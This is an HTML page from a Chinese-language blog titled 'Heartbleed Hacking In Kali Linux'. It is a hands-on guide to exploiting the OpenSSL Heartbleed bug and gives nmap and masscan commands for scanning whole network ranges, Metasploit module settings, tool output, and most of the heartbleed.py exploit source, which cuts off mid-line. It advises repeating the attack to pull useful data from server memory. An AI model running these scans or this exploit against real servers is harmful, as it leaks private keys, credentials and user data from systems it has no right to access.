@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Heartbleed Hacking In Kali Linux | Anysun</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="修改自：http://xiao106347.blog.163.comHeartbleed漏洞(CVE-2014-0160)就是用户通过TSL 加密链接向服务器发起 Client Hello询问，测服务器是否正常在线干活(形象的比喻就是心脏脉搏)，服务器发回Server hello，表明正常建立SSL通信。每次询问都会附加一个询问的字符长度pad length，bug来了，如果这个pad lengt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Heartbleed Hacking In Kali Linux">
+<meta property="og:url" content="http://anysun.gitcafe.io/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/index.html">
+<meta property="og:site_name" content="Anysun">
+<meta property="og:description" content="修改自：http://xiao106347.blog.163.comHeartbleed漏洞(CVE-2014-0160)就是用户通过TSL 加密链接向服务器发起 Client Hello询问，测服务器是否正常在线干活(形象的比喻就是心脏脉搏)，服务器发回Server hello，表明正常建立SSL通信。每次询问都会附加一个询问的字符长度pad length，bug来了，如果这个pad lengt">
+<meta property="og:image" content="http://anysun.gitcafe.io/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/title.png">
+<meta property="og:image" content="http://anysun.gitcafe.io/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/msf.png">
+<meta property="og:image" content="http://anysun.gitcafe.io/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/heartbleed_py.png">
+<meta property="og:updated_time" content="2015-11-10T06:33:19.765Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Heartbleed Hacking In Kali Linux">
+<meta name="twitter:description" content="修改自：http://xiao106347.blog.163.comHeartbleed漏洞(CVE-2014-0160)就是用户通过TSL 加密链接向服务器发起 Client Hello询问，测服务器是否正常在线干活(形象的比喻就是心脏脉搏)，服务器发回Server hello，表明正常建立SSL通信。每次询问都会附加一个询问的字符长度pad length，bug来了，如果这个pad lengt">
+  
+    <link rel="alternative" href="/atom.xml" title="Anysun" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="/img/anysun.png" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Anysun</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">No pains No gains</p>
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>关于我</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="/#" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="/#" title="weibo">weibo</a>
+					        
+								<a class="rss" target="_blank" href="/#" title="rss">rss</a>
+					        
+								<a class="zhihu" target="_blank" href="/#" title="zhihu">zhihu</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/CVE/" style="font-size: 10px;">CVE</a> <a href="/tags/Exploit/" style="font-size: 10px;">Exploit</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Heartbleed/" style="font-size: 10px;">Heartbleed</a> <a href="/tags/Kali/" style="font-size: 13.33px;">Kali</a> <a href="/tags/Linux/" style="font-size: 13.33px;">Linux</a> <a href="/tags/MS15-051/" style="font-size: 10px;">MS15-051</a> <a href="/tags/Pixiewps/" style="font-size: 10px;">Pixiewps</a> <a href="/tags/Reaver/" style="font-size: 10px;">Reaver</a> <a href="/tags/WPS/" style="font-size: 10px;">WPS</a> <a href="/tags/anysun/" style="font-size: 10px;">anysun</a> <a href="/tags/fierce/" style="font-size: 10px;">fierce</a> <a href="/tags/hello/" style="font-size: 10px;">hello</a> <a href="/tags/jekyll/" style="font-size: 10px;">jekyll</a> <a href="/tags/kali/" style="font-size: 16.67px;">kali</a> <a href="/tags/linux/" style="font-size: 20px;">linux</a> <a href="/tags/pixie/" style="font-size: 10px;">pixie</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/ubuntu/" style="font-size: 13.33px;">ubuntu</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/拉取/" style="font-size: 10px;">拉取</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">奥巴马的博客</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">卡卡的美丽传说</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">本泽马的博客</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">吉格斯的博客</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">习大大大不同</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://localhost:4000/">托蒂的博客</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">我是谁，我从哪里来，我到哪里去？我就是我，是颜色不一样的吃货…</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Anysun</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/anysun.png" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Anysun</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">No pains No gains</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="/#" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="/#" title="weibo">weibo</a>
+			        
+						<a class="rss" target="_blank" href="/#" title="rss">rss</a>
+			        
+						<a class="zhihu" target="_blank" href="/#" title="zhihu">zhihu</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-Heartbleed-Hacking-In-Kali-Linux" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/" class="article-date">
+  	<time datetime="2015-11-09T11:46:47.000Z" itemprop="datePublished">2015-11-09</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Heartbleed Hacking In Kali Linux
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hack/">Hack</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Heartbleed/">Heartbleed</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li></ul>
+	</div>
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>修改自：<a href="http://xiao106347.blog.163.com/blog/static/215992078201464059117/" target="_blank" rel="external">http://xiao106347.blog.163.com</a><br><img src="/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/title.png" alt="Heartbleed" title="Heartbleed"><br>Heartbleed漏洞(CVE-2014-0160)就是用户通过TSL 加密链接向服务器发起 Client Hello询问，测服务器是否正常在线干活(形象的比喻就是心脏脉搏)，服务器发回Server hello，表明正常建立SSL通信。每次询问都会附加一个询问的字符长度pad length，bug来了，如果这个pad length大于实际的长度，服务器还是会返回同样规模的字符信息，于是造成了内存里信息的越界访问…</p>
+<p>接下来这里就演示下分别用两个工具利用心脏出血漏洞读取服务器内存信息。<font color="#FF0000">因为内存里的信息不是一成不变的，所以不是每次都会出好东西的，所以要多爆几次。</font><br><a id="more"></a></p>
+<h3 id="工具1:_Nmap_+_MSFConsole"><strong>工具1: Nmap + MSFConsole</strong></h3><p>非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：</p>
+<blockquote>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">~</font># cd /usr/share/nmap/scripts/</p>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">/usr/share/nmap/scripts</font># wget <a href="https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse</a></p>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">/usr/share/nmap/scripts</font># cd /usr/share/nmap/nselib/</p>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">/usr/share/nmap/nselib</font># wget <a href="https://svn.nmap.org/nmap/nselib/tls.lua" target="_blank" rel="external">https://svn.nmap.org/nmap/nselib/tls.lua</a></p>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">~</font># nmap –script-updatedb</p>
+</blockquote>
+<p>添加成功之后扫描一个没有更新openssl的网站：</p>
+<blockquote>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">~</font># nmap -n -p 443 -Pn –script=ssl-heartbleed servers_ip</p>
+</blockquote>
+<p>出现如下漏洞信息：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for xxx.yyy (xxx_ip)</span><br><span class="line">Host is up (<span class="operator">0.<span class="number">071</span>s latency).</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line"><span class="number">443</span>/tcp <span class="keyword">open</span>  https</span><br><span class="line">| ssl-heartbleed:</span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   The Heartbleed Bug <span class="keyword">is</span> a serious vulnerability <span class="keyword">in</span> the popular OpenSSL cryptographic software <span class="keyword">library</span>. It allows <span class="keyword">for</span> stealing information intended <span class="keyword">to</span> be protected <span class="keyword">by</span> SSL/TLS encryption.</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: <span class="keyword">High</span></span><br><span class="line">|     Description:</span><br><span class="line">|       OpenSSL <span class="keyword">versions</span> <span class="number">1.0</span><span class="number">.1</span> <span class="keyword">and</span> <span class="number">1.0</span><span class="number">.2</span>-beta releases (<span class="keyword">including</span> <span class="number">1.0</span><span class="number">.1</span><span class="keyword">f</span> <span class="keyword">and</span> <span class="number">1.0</span><span class="number">.2</span>-beta1) <span class="keyword">of</span> OpenSSL <span class="keyword">are</span> affected <span class="keyword">by</span> the Heartbleed bug. The bug allows <span class="keyword">for</span> reading <span class="keyword">memory</span> <span class="keyword">of</span> systems protected <span class="keyword">by</span> the vulnerable OpenSSL <span class="keyword">versions</span> <span class="keyword">and</span> could <span class="keyword">allow</span> <span class="keyword">for</span> disclosure <span class="keyword">of</span> otherwise encrypted confidential information <span class="keyword">as</span> well <span class="keyword">as</span> the encryption <span class="keyword">keys</span> themselves.</span><br><span class="line">|</span><br><span class="line">|     <span class="keyword">References</span>:</span><br><span class="line">|       <span class="keyword">http</span>://cvedetails.com/cve/<span class="number">2014</span>-<span class="number">0160</span>/</span><br><span class="line">|       https://cve.mitre.org/cgi-<span class="keyword">bin</span>/cvename.cgi?<span class="keyword">name</span>=CVE-<span class="number">2014</span>-<span class="number">0160</span></span><br><span class="line">|_      <span class="keyword">http</span>://www.openssl.org/news/secadv_20140407.txt</span></span><br></pre></td></tr></table></figure></p>
+<p>然后msfconsole载入 <font color="#FF0000">auxiliary/scanner/ssl/openssl_heartbleed</font> 模块：</p>
+<blockquote>
+<p>msf &gt; use auxiliary/scanner/ssl/openssl_heartbleed<br>set RHOSTS xxx_ip<br>set RPORT 443<br>set VERBOSE true<br>exploit</p>
+</blockquote>
+<p>如图所示<br><img src="/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/msf.png" alt="msf exploit" title="msf exploit"></p>
+<h3 id="工具2:_heartbleed-py"><strong>工具2: heartbleed.py</strong></h3><p>使用方法：</p>
+<font color="red">python heartbleed.py server_ip</font>
+
+<blockquote>
+<p><font color="#FF0000">root@bogon</font>:<font color="#6495ED">~</font># python heartbleed.py xxx-ip<br>Scanning xxx-ip on port 443<br>Connecting…<br>Sending Client Hello…<br>Waiting for Server Hello…<br> … received message: type = 22, ver = 0302, length = 58<br> … received message: type = 22, ver = 0302, length = 759<br> … received message: type = 22, ver = 0302, length = 397<br> … received message: type = 22, ver = 0302, length = 4<br>Server TLS version was 1.2</p>
+<p>Sending heartbeat request…<br> … received message: type = 24, ver = 0302, length = 16384<br>Received heartbeat response:<br>……………….</p>
+</blockquote>
+<p>如图所示<br><img src="/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/heartbleed_py.png" alt="Heartbleed.py" title="Heartbleed.py"></p>
+<p>源码见文章底部</p>
+<h3 id="批量扫描"><strong>批量扫描</strong></h3><p>使用masscan：</p>
+<blockquote>
+<font color="#FF0000">masscan -p443 x.x.x.x/y -oL port443.list</font>
+
+</blockquote>
+<p>对网段x.x.x.x/y批量扫描开启443端口的ip，保存为port443.list</p>
+<blockquote>
+<font color="#FF0000">nmap -iL port443.list -p 443 –script=ssl-heartbleed</font>
+
+</blockquote>
+<p>nmap调用脚本扫描这些地址里有heartbleed漏洞的ip</p>
+<p><strong>heartbleed.py源码</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Quick and dirty demonstration of CVE-2014-0160 originally by Jared Stafford (jspenguin@jspenguin.org)</span></span><br><span class="line"><span class="comment"># The author disclaims copyright to this source code.</span></span><br><span class="line"><span class="comment"># Modified by SensePost based on lots of other people's efforts (hard to work out credit via PasteBin)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"></span><br><span class="line">options = OptionParser(usage=<span class="string">'%prog server [options]'</span>, description=<span class="string">'Test for SSL heartbeat vulnerability (CVE-2014-0160)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-p'</span>, <span class="string">'--port'</span>, type=<span class="string">'int'</span>, default=<span class="number">443</span>, help=<span class="string">'TCP port to test (default: 443)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-n'</span>, <span class="string">'--num'</span>, type=<span class="string">'int'</span>, default=<span class="number">1</span>, help=<span class="string">'Number of heartbeats to send if vulnerable (defines how much memory you get back) (default: 1)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-f'</span>, <span class="string">'--file'</span>, type=<span class="string">'str'</span>, default=<span class="string">'dump.bin'</span>, help=<span class="string">'Filename to write dumped memory too (default: dump.bin)'</span>)</span><br><span class="line">options.add_option(<span class="string">'-q'</span>, <span class="string">'--quiet'</span>, default=<span class="keyword">False</span>, help=<span class="string">'Do not display the memory dump'</span>, action=<span class="string">'store_true'</span>)</span><br><span class="line">options.add_option(<span class="string">'-s'</span>, <span class="string">'--starttls'</span>, action=<span class="string">'store_true'</span>, default=<span class="keyword">False</span>, help=<span class="string">'Check STARTTLS (smtp only right now)'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">hello = h2bin(<span class="string">'''</span><br><span class="line">16 03 02 00  dc 01 00 00 d8 03 02 53</span><br><span class="line">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><br><span class="line">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><br><span class="line">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><br><span class="line">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><br><span class="line">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><br><span class="line">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><br><span class="line">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><br><span class="line">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><br><span class="line">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><br><span class="line">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><br><span class="line">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><br><span class="line">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><br><span class="line">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><br><span class="line">00 0f 00 01 01</span><br><span class="line">'''</span>)</span><br><span class="line"></span><br><span class="line">hbv10 = h2bin(<span class="string">'''</span><br><span class="line">18 03 01 00 03</span><br><span class="line">01 40 00</span><br><span class="line">'''</span>)</span><br><span class="line"></span><br><span class="line">hbv11 = h2bin(<span class="string">'''</span><br><span class="line">18 03 02 00 03</span><br><span class="line">01 40 00</span><br><span class="line">'''</span>)</span><br><span class="line"></span><br><span class="line">hbv12 = h2bin(<span class="string">'''</span><br><span class="line">18 03 03 00 03</span><br><span class="line">01 40 00</span><br><span class="line">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexdump</span><span class="params">(s, dumpf, quiet)</span>:</span></span><br><span class="line">    dump = open(dumpf,<span class="string">'a'</span>)</span><br><span class="line">    dump.write(s)</span><br><span class="line">    dump.close()</span><br><span class="line">    <span class="keyword">if</span> quiet: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, len(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</span><br><span class="line">        hxdat = <span class="string">' '</span>.join(<span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        pdat = <span class="string">''</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= ord(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">'.'</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'  %04x: %-48s %s'</span> % (b, hxdat, pdat)</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span><span class="params">(s, length, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = <span class="string">''</span></span><br><span class="line">    remain = length</span><br><span class="line">    <span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">        rtime = endtime - time.time()</span><br><span class="line">        <span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> rdata:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> rdata</span><br><span class="line">        r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            <span class="comment"># EOF?</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= len(data)</span><br><span class="line">    <span class="keyword">return</span> rdata</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span><span class="params">(s)</span>:</span></span><br><span class="line">    hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record header - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    typ, ver, ln = struct.unpack(<span class="string">'&gt;BHH'</span>, hdr)</span><br><span class="line">    pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> pay <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record payload - server closed connection'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">' ... received message: type = %d, ver = %04x, length = %d'</span> % (typ, ver, len(pay))</span><br><span class="line">    <span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s, dumpf, host, quiet)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received from '</span>+host+<span class="string">', server likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></span><br><span class="line">            hexdump(pay, dumpf, quiet)</span><br><span class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server '</span>+ host +<span class="string">' returned more data than it should - server is vulnerable!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Server '</span>+host+<span class="string">' processed malformed heartbeat, but did not return any extra data.'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">'Received alert:'</span></span><br><span class="line">            hexdump(pay, 